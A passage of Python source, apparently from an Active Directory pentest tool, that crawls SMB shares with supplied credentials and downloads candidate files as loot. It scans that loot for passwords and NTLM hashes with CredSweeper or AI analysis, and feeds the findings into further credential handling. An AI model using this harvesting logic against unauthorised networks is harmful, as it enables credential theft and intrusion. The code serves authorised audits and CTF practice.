def _run_post_mapping_deterministic_share_scan(
    shell: Any,
    *,
    domain: str,
    shares: list[str],
    hosts: list[str],
    share_map: dict[str, dict[str, str]] | None = None,
    username: str,
    password: str,
) -> dict[str, Any]:
    """Run deterministic share secret search via selected backend."""
    return _run_post_mapping_deterministic_share_scan_with_backend(
        shell=shell,
        domain=domain,
        shares=shares,
        hosts=hosts,
        share_map=share_map,
        username=username,
        password=password,
        backend=_resolve_deterministic_backend_from_method(
            _resolve_default_deterministic_share_analysis_method(
                shell,
                domain=domain,
                username=username,
                password=password,
            )
        ),
    )


def _run_post_mapping_deterministic_share_scan_with_backend(
    shell: Any,
    *,
    domain: str,
    shares: list[str],
    hosts: list[str],
    share_map: dict[str, dict[str, str]] | None = None,
    username: str,
    password: str,
    backend: str,
    cifs_mount_root: str | None = None,
    ai_configured: bool = False,
) -> dict[str, Any]:
    """Run deterministic share secret search via chosen backend."""
    return _run_post_mapping_deterministic_share_scan_sequence(
        shell=shell,
        domain=domain,
        shares=shares,
        hosts=hosts,
        share_map=share_map,
        username=username,
        password=password,
        backend=backend,
        cifs_mount_root=cifs_mount_root,
        ai_configured=ai_configured,
    )


def _run_post_mapping_deterministic_share_scan_sequence(
    shell: Any,
    *,
    domain: str,
    shares: list[str],
    hosts: list[str],
    share_map: dict[str, dict[str, str]] | None = None,
    username: str,
    password: str,
    backend: str,
    cifs_mount_root: str | None = None,
    ai_configured: bool = False,
) -> dict[str, Any]:
    """Run staged deterministic SMB analysis using a backend-specific runner."""
    phase_sequence = get_production_sensitive_scan_phase_sequence()
    if not phase_sequence:
        return {"completed": False, "credential_findings": 0, "phases_run": []}
    return _run_staged_smb_sensitive_scan(
        shell,
        domain=domain,
        shares=shares,
        hosts=hosts,
        share_map=share_map,
        username=username,
        password=password,
        backend=backend,
        cifs_mount_root=cifs_mount_root,
        ai_configured=ai_configured,
        prepare_backend_context=_prepare_post_mapping_deterministic_rclone_context,
        run_phase=_run_sensitive_scan_phase_with_backend,
        print_completion_summary=_print_deterministic_rclone_completion_summary,
        should_run_phase=_should_run_credential_phase,
        should_run_heavy_phase=_should_continue_with_heavy_artifact_analysis,
    )


def _print_deterministic_rclone_completion_summary(
    *,
    backend_context: dict[str, Any] | None,
) -> None:
    """Print one final production summary for deterministic rclone runs."""
    if not backend_context or backend_context.get("mode") not in {"direct", "mapped"}:
        return
    loot_root_rel = str(backend_context.get("loot_root_rel", "") or "").strip()
    if not loot_root_rel:
        return
    print_info(
        "Deterministic rclone analysis completed. "
        f"Loot root: {mark_sensitive(loot_root_rel, 'path')}."
    )


def _prepare_post_mapping_deterministic_rclone_context(
    shell: Any,
    *,
    domain: str,
    shares: list[str],
    hosts: list[str],
    share_map: dict[str, dict[str, str]] | None = None,
    username: str,
    password: str,
    backend: str,
) -> dict[str, Any]:
    """Prepare shared rclone state once for one production deterministic run."""
    mode = "mapped" if backend == "rclone_mapped" else "direct"
    workspace_cwd = shell._get_workspace_cwd()
    run_id = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    run_folder = f"{run_id}_{_slugify_token(username)}_{mode}"
    run_root_abs = domain_path(
        workspace_cwd,
        shell.domains_dir,
        domain,
        shell.smb_dir,
        "rclone",
        "deterministic",
        run_folder,
    )
    loot_root_abs = os.path.join(run_root_abs, "phases")
    os.makedirs(loot_root_abs, exist_ok=True)
    loot_root_rel = domain_relpath(
        shell.domains_dir,
        domain,
        shell.smb_dir,
        "rclone",
        "deterministic",
        run_folder,
        "phases",
    )
    rationale = "Audit traceability" if mode == "mapped" else "CTF speed"
    print_info(
        "Deterministic backend: "
        f"{mark_sensitive('rclone', 'text')} | Mode: {mark_sensitive(mode, 'text')} "
        f"({mark_sensitive(rationale, 'text')})."
    )
    print_info(f"Deterministic rclone loot root: {mark_sensitive(loot_root_rel, 'path')}.")

    context = {
        "completed": True,
        "mode": mode,
        "run_root_abs": run_root_abs,
        "loot_root_abs": loot_root_abs,
        "loot_root_rel": loot_root_rel,
        "aggregate_map_path": None,
    }
    if mode != "mapped":
        return context

    mapping_root_abs = os.path.join(run_root_abs, "mapping")
    run_output_abs = os.path.join(mapping_root_abs, "runs", run_folder)
    aggregate_map_abs = os.path.join(mapping_root_abs, "share_tree_map.json")
    mapping_result = _generate_rclone_mapping(
        shell=shell,
        domain=domain,
        username=username,
        password=password,
        hosts=hosts,
        shares=shares,
        share_map=share_map,
        run_output_abs=run_output_abs,
        aggregate_map_abs=aggregate_map_abs,
    )
    if not bool(mapping_result.get("success")):
        print_warning(
            "Fresh rclone mapping for deterministic analysis did not complete successfully."
        )
        return {**context, "completed": False, "mapping_result": mapping_result}
    aggregate_map_rel = domain_relpath(
        shell.domains_dir,
        domain,
        shell.smb_dir,
        "rclone",
        "deterministic",
        run_folder,
        "mapping",
        "share_tree_map.json",
    )
    print_info(
        "Deterministic rclone mapping prepared at "
        f"{mark_sensitive(aggregate_map_rel, 'path')}."
    )
    context["aggregate_map_path"] = aggregate_map_abs
    context["mapping_result"] = mapping_result
    return context


def _should_continue_with_deeper_sensitive_scan(
    *,
    shell: Any,
    domain: str,
    phase_result: dict[str, Any],
) -> bool:
    """Ask whether deeper deterministic SMB analysis should continue."""
    return _service_should_continue_with_deeper_sensitive_scan(
        shell=shell,
        domain=domain,
        phase_result=phase_result,
    )


def _should_run_credential_phase(
    *,
    shell: Any,
    domain: str,
    phase: str,
    prior_phase_result: dict[str, Any] | None,
) -> bool:
    """Ask whether one credential phase should run."""
    return _service_should_run_credential_phase(
        shell=shell,
        domain=domain,
        phase=phase,
        prior_phase_result=prior_phase_result,
    )


def _should_continue_with_heavy_artifact_analysis(
    *,
    shell: Any,
    domain: str,
) -> bool:
    """Ask whether to run the slowest artifact analysis phase."""
    return _service_should_continue_with_heavy_artifact_analysis(
        shell=shell,
        domain=domain,
    )


def _should_skip_sensitive_scan_prompt_for_ctf_pwned(*, shell: Any, domain: str) -> bool:
    """Return True when CTF SMB follow-up prompts should be skipped entirely."""
    return _service_should_skip_sensitive_scan_prompt_for_ctf_pwned(
        shell=shell,
        domain=domain,
    )


def _run_sensitive_scan_phase_with_backend(
    shell: Any,
    *,
    domain: str,
    shares: list[str],
    hosts: list[str],
    share_map: dict[str, dict[str, str]] | None = None,
    username: str,
    password: str,
    backend: str,
    phase: str,
    cifs_mount_root: str | None = None,
    backend_context: dict[str, Any] | None = None,
    analysis_context: dict[str, Any] | None = None,
) -> dict[str, Any]:
    """Run one deterministic sensitive-data phase through a selected backend."""
    if backend in {"rclone_direct", "rclone_mapped"}:
        if phase in {
            SMB_SENSITIVE_SCAN_PHASE_TEXT_CREDENTIALS,
            SMB_SENSITIVE_SCAN_PHASE_DOCUMENT_CREDENTIALS,
        }:
            return _run_post_mapping_deterministic_rclone_credsweeper_scan(
                shell=shell,
                domain=domain,
                shares=shares,
                hosts=hosts,
                share_map=share_map,
                username=username,
                password=password,
                phase=phase,
                backend_context=backend_context or {},
                analysis_context=analysis_context or {},
            )
        return _run_post_mapping_deterministic_rclone_artifact_scan(
            shell=shell,
            domain=domain,
            shares=shares,
            hosts=hosts,
            share_map=share_map,
            username=username,
                password=password,
                phase=phase,
                backend_context=backend_context or {},
            )

    if backend == "cifs":
        if phase in {
            SMB_SENSITIVE_SCAN_PHASE_TEXT_CREDENTIALS,
            SMB_SENSITIVE_SCAN_PHASE_DOCUMENT_CREDENTIALS,
        }:
            return _run_post_mapping_deterministic_cifs_credsweeper_scan(
                shell=shell,
                domain=domain,
                shares=shares,
                hosts=hosts,
                share_map=share_map,
                username=username,
                password=password,
                cifs_mount_root=cifs_mount_root,
                profile=str(get_sensitive_phase_definition(phase).get("profile", "")),
                phase=phase,
                analysis_context=analysis_context or {},
            )
        return _run_post_mapping_deterministic_cifs_artifact_scan(
            shell=shell,
            domain=domain,
            shares=shares,
            hosts=hosts,
            share_map=share_map,
            username=username,
            password=password,
            cifs_mount_root=cifs_mount_root,
            phase=phase,
        )

    if phase in {
        SMB_SENSITIVE_SCAN_PHASE_TEXT_CREDENTIALS,
        SMB_SENSITIVE_SCAN_PHASE_DOCUMENT_CREDENTIALS,
    }:
        manspider_passw = getattr(shell, "manspider_passw", None)
        if not callable(manspider_passw):
            print_warning(
                "Deterministic SMB share search is unavailable: "
                "shell.manspider_passw is not callable."
            )
            return {"completed": False, "credential_findings": 0, "phase": phase}
        return manspider_passw(
            domain,
            username,
            password,
            shares,
            hosts,
            profile=str(get_sensitive_phase_definition(phase).get("profile", "")),
            phase=phase,
            analysis_context=analysis_context or {},
        ) or {"completed": True, "credential_findings": 0, "phase": phase}

    manspider_extensions = getattr(shell, "manspider_extensions", None)
    if not callable(manspider_extensions):
        print_warning(
            "Deterministic SMB artifact analysis is unavailable: "
            "shell.manspider_extensions is not callable."
        )
        return {"completed": False, "artifact_hits": 0, "phase": phase}
    return manspider_extensions(
        domain,
        username,
        password,
        shares,
        hosts,
        extensions=get_manspider_phase_extensions(phase),
        phase=phase,
    ) or {"completed": True, "artifact_hits": 0, "phase": phase}


def _try_reuse_cached_rclone_credential_phase(
    *,
    shell: Any,
    domain: str,
    phase: str,
    username: str,
    hosts: list[str],
    shares: list[str],
    loot_dir: str,
    cache_paths: dict[str, str],
    cache_enabled: bool,
    cache_entries: list[Any],
    cache_signature: str,
    cache_service: Any,
    analysis_context: dict[str, Any],
) -> dict[str, Any] | None:
    """Return cached credential phase results when the deterministic rclone cache is reusable."""
    if not cache_enabled or not cache_entries:
        return None
    cache_payload = cache_service.load_cache_manifest(
        manifest_path=cache_paths["manifest_path"]
    )
    cache_ok, cache_reason = cache_service.cache_payload_is_reusable(
        manifest_payload=cache_payload,
        expected_signature=cache_signature,
        required_paths=[
            loot_dir,
            cache_paths["credsweeper_dir"],
        ],
    )
    marked_phase_label = mark_sensitive(
        str(get_sensitive_phase_definition(phase).get("label", phase)),
        "text",
    )
    if not cache_ok:
        print_info_debug(
            "Deterministic rclone phase cache not reused: "
            f"phase={marked_phase_label} reason={mark_sensitive(cache_reason, 'text')}"
        )
        return None
    candidate_files = (
        int(cache_payload.get("candidate_files", 0) or 0)
        if isinstance(cache_payload, dict)
        else 0
    )
    dev_cache_action = _select_dev_cache_action(
        shell=shell,
        title="SMB rclone phase cache:",
        summary_lines=[
            f"Phase: {str(get_sensitive_phase_definition(phase).get('label', phase))}",
            f"Principal: {username}",
            f"Cache: {cache_paths['cache_root_rel']}",
            f"Candidates: {candidate_files}",
        ],
    )
    if dev_cache_action == "refresh":
        print_info(
            f"Refreshing deterministic rclone phase {marked_phase_label} because dev mode requested a new run."
        )
        return None
    analysis_engine = _select_loot_credential_analysis_engine(
        shell=shell,
        analysis_context=analysis_context,
        phase=phase,
        phase_label=str(get_sensitive_phase_definition(phase).get("label", phase)),
        candidate_files=candidate_files,
    )
    credsweeper_findings = cache_service.deserialize_grouped_findings(
        dict(cache_payload.get("findings") or {})
        if isinstance(cache_payload, dict)
        else {}
    )
    structured_stats = (
        dict(cache_payload.get("structured_stats") or {})
        if isinstance(cache_payload, dict)
        else {}
    )
    total_findings = (
        int(cache_payload.get("total_findings", 0) or 0)
        if isinstance(cache_payload, dict)
        else 0
    )
    files_with_findings = (
        int(cache_payload.get("files_with_findings", 0) or 0)
        if isinstance(cache_payload, dict)
        else 0
    )
    cache_generated_at = (
        str(cache_payload.get("generated_at") or "").strip()
        if isinstance(cache_payload, dict)
        else ""
    )
    cache_age_seconds = _resolve_smb_mapping_cache_age_seconds(cache_generated_at)
    cache_age_label = (
        f"{cache_age_seconds:.0f}s old"
        if cache_age_seconds is not None
        else "age unknown"
    )
    print_info(
        "Reusing cached deterministic rclone phase outputs for "
        f"{marked_phase_label} ({candidate_files} files, {cache_age_label}, "
        f"loot={mark_sensitive(cache_paths['cache_root_rel'], 'path')})."
    )
    if analysis_engine == _SMB_LOOT_ANALYSIS_ENGINE_CREDSWEEPER and credsweeper_findings:
        shell.handle_found_credentials(
            credsweeper_findings,
            domain,
            source_hosts=hosts,
            source_shares=shares,
            auth_username=username,
            source_artifact="rclone deterministic share scan (cached)",
        )
    loot_rel = os.path.relpath(loot_dir, shell._get_workspace_cwd())
    ntlm_hash_findings = structured_stats.get("ntlm_hash_findings")
    if isinstance(ntlm_hash_findings, list) and ntlm_hash_findings:
        render_ntlm_hash_findings_flow(
            shell,
            domain=domain,
            loot_dir=loot_dir,
            loot_rel=loot_rel,
            phase_label=str(get_sensitive_phase_definition(phase).get("label", phase)),
            ntlm_hash_findings=[
                item for item in ntlm_hash_findings if isinstance(item, dict)
            ],
            source_scope=(
                "SMB file NTLM hash findings from "
                f"{str(get_sensitive_phase_definition(phase).get('label', phase))}"
            ),
            fallback_source_hosts=hosts,
            fallback_source_shares=shares,
        )
    structured_files_with_findings = int(structured_stats.get("files_with_findings", 0) or 0)
    total_files_with_findings = int(files_with_findings) + structured_files_with_findings
    print_info(
        "Deterministic rclone phase summary: "
        f"phase={marked_phase_label} candidate_files={candidate_files} "
        f"files_with_findings={files_with_findings} "
        f"credential_like_findings={total_findings} "
        f"loot={mark_sensitive(loot_rel, 'path')} "
        f"cache={mark_sensitive('reused', 'text')}"
    )
    if not credsweeper_findings and structured_files_with_findings == 0:
        _print_analyzed_no_findings_preview(
            loot_dir=loot_dir,
            loot_rel=loot_rel,
            candidate_files=candidate_files,
            phase_label=str(get_sensitive_phase_definition(phase).get("label", phase)),
            preview_limit=5,
        )
    return {
        "completed": True,
        "credential_findings": int(total_findings),
        "files_with_findings": int(total_files_with_findings),
        "candidate_files": int(candidate_files),
        "phase": phase,
        "loot_dir": loot_dir,
        "cache_reused": True,
        "ai_attempted": False,
        "ai_success": None,
    }


def _run_rclone_credential_phase_download(
    *,
    shell: Any,
    domain: str,
    shares: list[str],
    hosts: list[str],
    share_map: dict[str, dict[str, str]] | None,
    username: str,
    password: str,
    phase_profile: str,
    loot_dir: str,
    manifest_dir: str,
    cache_enabled: bool,
    cache_paths: dict[str, str],
    backend_context: dict[str, Any],
    max_document_file_size_bytes: int | None,
) -> dict[str, Any]:
    """Download deterministic rclone credential loot for one phase."""
    if str(backend_context.get("mode", "")) == "mapped":
        from adscan_internal.services.share_mapping_service import ShareMappingService

        aggregate_map_path = str(backend_context.get("aggregate_map_path", "") or "").strip()
        share_mapping_service = ShareMappingService()
        grouped_remote_paths = share_mapping_service.resolve_candidate_remote_paths_from_aggregate(
            aggregate_map_path=aggregate_map_path,
            hosts=hosts,
            shares=shares,
            extensions=get_sensitive_file_extensions(phase_profile),
            max_file_size_bytes=max_document_file_size_bytes,
        )
        if cache_enabled:
            shutil.rmtree(loot_dir, ignore_errors=True)
            shutil.rmtree(cache_paths["credsweeper_dir"], ignore_errors=True)
            os.makedirs(loot_dir, exist_ok=True)
            os.makedirs(cache_paths["credsweeper_dir"], exist_ok=True)
        return _run_rclone_copy_mapped_loot_download(
            shell=shell,
            domain=domain,
            username=username,
            password=password,
            grouped_remote_paths=grouped_remote_paths,
            loot_dir=loot_dir,
            manifest_dir=manifest_dir,
            mostly_small_files=True,
            operation_label="deterministic mapped scan",
            max_size_bytes=max_document_file_size_bytes,
        )
    target_pairs = _resolve_cifs_host_share_targets(
        hosts=hosts,
        shares=shares,
        share_map=share_map,
    )
    return _run_rclone_copy_loot_download(
        shell=shell,
        domain=domain,
        username=username,
        password=password,
        target_pairs=target_pairs,
        loot_dir=loot_dir,
        extensions=get_sensitive_file_extensions(phase_profile),
        mostly_small_files=True,
        operation_label="deterministic scan",
        max_size_bytes=max_document_file_size_bytes,
    )


def _finalize_rclone_credential_phase(
    *,
    shell: Any,
    domain: str,
    phase: str,
    hosts: list[str],
    shares: list[str],
    username: str,
    loot_dir: str,
    candidate_files: int,
    analysis_context: dict[str, Any],
    ai_history_path: str,
    credsweeper_path: str,
    credsweeper_output_dir: str,
    credsweeper_findings: dict[str, list[tuple[Any, Any, Any, Any, Any]]],
    structured_stats: dict[str, Any],
) -> dict[str, Any]:
    """Run post-download analysis and render final summary for one rclone credential phase."""
    analysis_result = run_loot_credential_analysis(
        shell,
        domain=domain,
        loot_dir=loot_dir,
        phase=phase,
        phase_label=str(get_sensitive_phase_definition(phase).get("label", phase)),
        candidate_files=candidate_files,
        analysis_context=analysis_context,
        ai_history_path=ai_history_path,
        credsweeper_path=credsweeper_path,
        credsweeper_output_dir=credsweeper_output_dir,
        jobs=get_default_credsweeper_jobs(),
        credsweeper_findings=credsweeper_findings,
    )
    combined_findings = dict(analysis_result.findings)
    ai_findings = list(analysis_result.ai_findings)
    ai_attempted = analysis_result.ai_attempted
    ai_success = analysis_result.ai_success
    analysis_engine = analysis_result.analysis_engine
    if ai_attempted:
        analysis_context["ai_attempted"] = True
        analysis_context["ai_success"] = ai_success
    if combined_findings and analysis_engine in {
        _SMB_LOOT_ANALYSIS_ENGINE_CREDSWEEPER,
        _SMB_LOOT_ANALYSIS_ENGINE_BOTH,
    }:
        shell.handle_found_credentials(
            combined_findings,
            domain,
            source_hosts=hosts,
            source_shares=shares,
            auth_username=username,
            source_artifact="rclone deterministic share scan",
            analysis_origin=("mixed" if analysis_engine == _SMB_LOOT_ANALYSIS_ENGINE_BOTH else "credsweeper"),
            ai_findings=ai_findings,
        )
    elif combined_findings and analysis_engine == _SMB_LOOT_ANALYSIS_ENGINE_AI:
        shell.handle_found_credentials(
            combined_findings,
            domain,
            source_hosts=hosts,
            source_shares=shares,
            auth_username=username,
            source_artifact="AI share loot analysis",
            analysis_origin="ai",
            ai_findings=ai_findings,
        )
    loot_rel = os.path.relpath(loot_dir, shell._get_workspace_cwd())
    ntlm_hash_findings = structured_stats.get("ntlm_hash_findings")
    if isinstance(ntlm_hash_findings, list) and ntlm_hash_findings:
        render_ntlm_hash_findings_flow(
            shell,
            domain=domain,
            loot_dir=loot_dir,
            loot_rel=loot_rel,
            phase_label=str(get_sensitive_phase_definition(phase).get("label", phase)),
            ntlm_hash_findings=[
                item for item in ntlm_hash_findings if isinstance(item, dict)
            ],
            source_scope=(
                "SMB file NTLM hash findings from "
                f"{str(get_sensitive_phase_definition(phase).get('label', phase))}"
            ),
            fallback_source_hosts=hosts,
            fallback_source_shares=shares,
        )
    ai_total_findings, ai_files_with_findings = _count_grouped_credential_findings(
        combined_findings
    )
    print_info(
        "Deterministic rclone phase summary: "
        f"phase={mark_sensitive(str(get_sensitive_phase_definition(phase).get('label', phase)), 'text')} "
        f"candidate_files={candidate_files} "
        f"files_with_findings={ai_files_with_findings} "
        f"credential_like_findings={ai_total_findings} "
        f"loot={mark_sensitive(loot_rel, 'path')} "
        f"analysis_engine={mark_sensitive(analysis_engine, 'text')}"
    )
    structured_files_with_findings = int(structured_stats.get("files_with_findings", 0) or 0)
    total_files_with_findings = int(ai_files_with_findings) + structured_files_with_findings
    if not combined_findings and structured_files_with_findings == 0:
        _print_analyzed_no_findings_preview(
            loot_dir=loot_dir,
            loot_rel=loot_rel,
            candidate_files=candidate_files,
            phase_label=str(get_sensitive_phase_definition(phase).get("label", phase)),
            preview_limit=5,
        )
    return {
        "completed": True,
        "credential_findings": int(ai_total_findings),
        "files_with_findings": int(total_files_with_findings),
        "candidate_files": int(candidate_files),
        "phase": phase,
        "loot_dir": loot_dir,
        "cache_reused": False,
        "ai_attempted": ai_attempted,
        "ai_success": ai_success,
    }


def _run_post_mapping_deterministic_rclone_credsweeper_scan(
    shell: Any,
    *,
    domain: str,
    shares: list[str],
    hosts: list[str],
    share_map: dict[str, dict[str, str]] | None = None,
    username: str,
    password: str,
    phase: str,
    backend_context: dict[str, Any],
    analysis_context: dict[str, Any] | None = None,
) -> dict[str, Any]:
    """Run one production deterministic rclone credential phase."""
    from adscan_internal.services.smb_rclone_phase_cache_service import (
        SMBRclonePhaseCacheService,
    )

    credsweeper_path = str(getattr(shell, "credsweeper_path", "") or "").strip()
    if not credsweeper_path:
        print_warning(
            "Deterministic rclone share analysis is unavailable because "
            "CredSweeper is not configured."
        )
        return {"completed": False, "credential_findings": 0, "phase": phase}

    phase_profile = str(get_sensitive_phase_definition(phase).get("profile", "")).strip()
    if not phase_profile:
        return {"completed": False, "credential_findings": 0, "phase": phase}

    phase_root_abs = os.path.join(str(backend_context.get("run_root_abs", "") or ""), phase)
    analysis_context = analysis_context or {}
    marked_phase_label = mark_sensitive(
        str(get_sensitive_phase_definition(phase).get("label", phase)),
        "text",
    )
    print_info(f"Running deterministic share analysis ({marked_phase_label}) via rclone.")
    max_document_file_size_bytes = get_sensitive_phase_max_file_size_bytes(phase)
    workspace_type = str(getattr(shell, "type", "") or "").strip().lower() or "unknown"
    cache_enabled = (
        workspace_type == "audit"
        and str(backend_context.get("mode", "") or "").strip() == "mapped"
    )
    cache_service = SMBRclonePhaseCacheService()
    cache_paths = _resolve_smb_rclone_phase_cache_paths(
        shell,
        domain=domain,
        username=username,
        phase=phase,
    )
    ai_history_path = _resolve_smb_loot_ai_history_path(
        shell,
        domain=domain,
        username=username,
        phase=phase,
        backend="rclone",
    )
    loot_dir = (
        cache_paths["loot_dir"]
        if cache_enabled
        else os.path.join(phase_root_abs, "loot")
    )
    manifest_dir = os.path.join(phase_root_abs, "manifests")
    os.makedirs(loot_dir, exist_ok=True)
    os.makedirs(manifest_dir, exist_ok=True)
    os.makedirs(cache_paths["credsweeper_dir"], exist_ok=True)

    cache_entries: list[Any] = []
    cache_signature = ""
    candidate_files = 0
    credsweeper_findings: dict[str, list[tuple[Any, Any, Any, Any, Any]]] = {}
    structured_stats: dict[str, Any] = {}

    if str(backend_context.get("mode", "")) == "mapped":
        aggregate_map_path = str(backend_context.get("aggregate_map_path", "") or "").strip()
        cache_entries = cache_service.resolve_candidate_entries_from_aggregate(
            aggregate_map_path=aggregate_map_path,
            hosts=hosts,
            shares=shares,
            extensions=get_sensitive_file_extensions(phase_profile),
            max_file_size_bytes=max_document_file_size_bytes,
        )
        cache_signature = cache_service.build_phase_signature(
            phase=phase,
            entries=cache_entries,
            max_file_size_bytes=max_document_file_size_bytes,
        )
        reused_result = _try_reuse_cached_rclone_credential_phase(
            shell=shell,
            domain=domain,
            phase=phase,
            username=username,
            hosts=hosts,
            shares=shares,
            loot_dir=loot_dir,
            cache_paths=cache_paths,
            cache_enabled=cache_enabled,
            cache_entries=cache_entries,
            cache_signature=cache_signature,
            cache_service=cache_service,
            analysis_context=analysis_context,
        )
        if reused_result is not None:
            return reused_result
    download_result = _run_rclone_credential_phase_download(
        shell=shell,
        domain=domain,
        shares=shares,
        hosts=hosts,
        share_map=share_map,
        username=username,
        password=password,
        phase_profile=phase_profile,
        loot_dir=loot_dir,
        manifest_dir=manifest_dir,
        cache_enabled=cache_enabled,
        cache_paths=cache_paths,
        backend_context=backend_context,
        max_document_file_size_bytes=max_document_file_size_bytes,
    )
    if not bool(download_result.get("success")):
        return {"completed": False, "credential_findings": 0, "phase": phase}

    candidate_files = _count_files_under_path(loot_dir)
    credsweeper_output_dir = (
        cache_paths["credsweeper_dir"]
        if cache_enabled
        else os.path.join(phase_root_abs, "credsweeper")
    )
    analysis_engine = _select_loot_credential_analysis_engine(
        shell=shell,
        analysis_context=analysis_context,
        phase=phase,
        phase_label=str(get_sensitive_phase_definition(phase).get("label", phase)),
        candidate_files=candidate_files,
    )
    if analysis_engine in {
        _SMB_LOOT_ANALYSIS_ENGINE_CREDSWEEPER,
        _SMB_LOOT_ANALYSIS_ENGINE_BOTH,
    }:
        credsweeper_findings = _run_credsweeper_path_scan_with_scope(
            credsweeper_service=shell._get_credsweeper_service(),
            credsweeper_path=credsweeper_path,
            path_to_scan=loot_dir,
            json_output_dir=credsweeper_output_dir,
            benchmark_scope=(
                SMB_SENSITIVE_BENCHMARK_SCOPE_BINARY_ONLY
                if phase == SMB_SENSITIVE_SCAN_PHASE_DOCUMENT_CREDENTIALS
                else SMB_SENSITIVE_BENCHMARK_SCOPE_TEXT_ONLY
            ),
            candidate_files=candidate_files,
            jobs=get_default_credsweeper_jobs(),
            find_by_ext=False,
        )
    structured_stats = structured_stats or shell._get_spidering_service().process_local_structured_files(
        root_path=loot_dir,
        phase=phase,
        domain=domain,
        source_hosts=hosts,
        source_shares=shares,
        auth_username=username,
        apply_actions=True,
    )
    total_findings, files_with_findings = _count_grouped_credential_findings(credsweeper_findings)
    finalized_result = _finalize_rclone_credential_phase(
        shell=shell,
        domain=domain,
        phase=phase,
        hosts=hosts,
        shares=shares,
        username=username,
        loot_dir=loot_dir,
        candidate_files=candidate_files,
        analysis_context=analysis_context,
        ai_history_path=ai_history_path,
        credsweeper_path=credsweeper_path,
        credsweeper_output_dir=credsweeper_output_dir,
        credsweeper_findings=credsweeper_findings,
        structured_stats=structured_stats,
    )
    if cache_enabled and cache_entries:
        cache_service.write_cache_manifest(
            manifest_path=cache_paths["manifest_path"],
            phase=phase,
            signature=cache_signature,
            candidate_files=candidate_files,
            extra={
                "findings": cache_service.serialize_grouped_findings(credsweeper_findings),
                "structured_stats": structured_stats,
                "total_findings": int(total_findings),
                "files_with_findings": int(files_with_findings),
            },
        )
    return finalized_result


def _print_analyzed_no_findings_preview(
    *,
    loot_dir: str,
    loot_rel: str,
    candidate_files: int,
    phase_label: str | None = None,
    preview_limit: int = 5,
) -> None:
    """Print a compact preview of analyzed files when no credentials were extracted."""
    render_no_extracted_findings_preview(
        loot_dir=loot_dir,
        loot_rel=loot_rel,
        analyzed_count=int(candidate_files or 0),
        category="credential",
        phase_label=phase_label,
        preview_limit=preview_limit,
    )


def _collect_loot_file_preview(*, loot_dir: str, preview_limit: int = 5) -> list[str]:
    """Return a deterministic preview of files downloaded for one loot phase."""
    return collect_loot_file_preview(
        loot_dir=loot_dir,
        preview_limit=preview_limit,
    )


def _run_post_mapping_deterministic_rclone_artifact_scan(
    shell: Any,
    *,
    domain: str,
    shares: list[str],
    hosts: list[str],
    share_map: dict[str, dict[str, str]] | None = None,
    username: str,
    password: str,
    phase: str,
    backend_context: dict[str, Any],
) -> dict[str, Any]:
    """Run one production deterministic rclone artifact phase."""
    from adscan_internal.services.smb_rclone_phase_cache_service import (
        SMBRclonePhaseCacheService,
    )
    from adscan_internal.services.share_mapping_service import ShareMappingService

    phase_root_abs = os.path.join(str(backend_context.get("run_root_abs", "") or ""), phase)
    phase_label = str(get_sensitive_phase_definition(phase).get("label", phase))
    print_info(
        f"Running deterministic share analysis ({mark_sensitive(phase_label, 'text')}) via rclone."
    )
    workspace_type = str(getattr(shell, "type", "") or "").strip().lower() or "unknown"
    cache_enabled = (
        workspace_type == "audit"
        and str(backend_context.get("mode", "") or "").strip() == "mapped"
    )
    cache_service = SMBRclonePhaseCacheService()
    cache_paths = _resolve_smb_rclone_phase_cache_paths(
        shell,
        domain=domain,
        username=username,
        phase=phase,
    )
    loot_dir = (
        cache_paths["loot_dir"]
        if cache_enabled
        else os.path.join(phase_root_abs, "loot")
    )
    manifest_dir = os.path.join(phase_root_abs, "manifests")
    os.makedirs(loot_dir, exist_ok=True)
    os.makedirs(manifest_dir, exist_ok=True)
    cache_entries: list[Any] = []
    cache_signature = ""
    if str(backend_context.get("mode", "")) == "mapped":
        aggregate_map_path = str(backend_context.get("aggregate_map_path", "") or "").strip()
        share_mapping_service = ShareMappingService()
        cache_entries = cache_service.resolve_candidate_entries_from_aggregate(
            aggregate_map_path=aggregate_map_path,
            hosts=hosts,
            shares=shares,
            extensions=get_sensitive_phase_extensions(phase),
        )
        cache_signature = cache_service.build_phase_signature(
            phase=phase,
            entries=cache_entries,
        )
        if cache_enabled and cache_entries:
            cache_payload = cache_service.load_cache_manifest(
                manifest_path=cache_paths["manifest_path"]
            )
            cache_ok, cache_reason = cache_service.cache_payload_is_reusable(
                manifest_payload=cache_payload,
                expected_signature=cache_signature,
                required_paths=[loot_dir],
            )
            if cache_ok:
                dev_cache_action = _select_dev_cache_action(
                    shell=shell,
                    title="SMB rclone phase cache:",
                    summary_lines=[
                        f"Phase: {phase_label}",
                        f"Principal: {username}",
                        f"Cache: {cache_paths['cache_root_rel']}",
                        f"Artifacts: {int(cache_payload.get('artifact_hits', 0) or 0) if isinstance(cache_payload, dict) else 0}",
                    ],
                )
                if dev_cache_action == "refresh":
                    print_info(
                        "Refreshing deterministic rclone artifact phase because dev mode requested a new run."
                    )
                else:
                    artifact_records = _deserialize_cached_artifact_records(
                        list(cache_payload.get("artifact_records") or [])
                        if isinstance(cache_payload, dict)
                        else []
                    )
                    artifact_hits = int(cache_payload.get("artifact_hits", 0) or 0) if isinstance(cache_payload, dict) else 0
                    loot_rel = os.path.relpath(loot_dir, shell._get_workspace_cwd())
                    cache_generated_at = (
                        str(cache_payload.get("generated_at") or "").strip()
                        if isinstance(cache_payload, dict)
                        else ""
                    )
                    cache_age_seconds = _resolve_smb_mapping_cache_age_seconds(cache_generated_at)
                    cache_age_label = (
                        f"{cache_age_seconds:.0f}s old"
                        if cache_age_seconds is not None
                        else "age unknown"
                    )
                    print_info(
                        "Reusing cached deterministic rclone phase outputs for "
                        f"{mark_sensitive(phase_label, 'text')} ({artifact_hits} files, {cache_age_label}, "
                        f"loot={mark_sensitive(cache_paths['cache_root_rel'], 'path')})."
                    )
                    if not artifact_records:
                        print_info(f"No artifact candidates were detected for phase {phase_label}.")
                    else:
                        report_path = _persist_artifact_processing_report(
                            phase_root_abs=cache_paths["cache_root_abs"],
                            records=artifact_records,
                        )
                        _render_artifact_processing_summary(
                            shell,
                            phase_label=phase_label,
                            records=artifact_records,
                            report_path=report_path,
                        )
                        if artifact_records_extracted_nothing(artifact_records):
                            render_no_extracted_findings_preview(
                                loot_dir=loot_dir,
                                loot_rel=loot_rel,
                                analyzed_count=artifact_hits,
                                category="artifact",
                                phase_label=phase_label,
                                preview_limit=5,
                            )
                    print_info(
                        "Deterministic rclone artifact summary: "
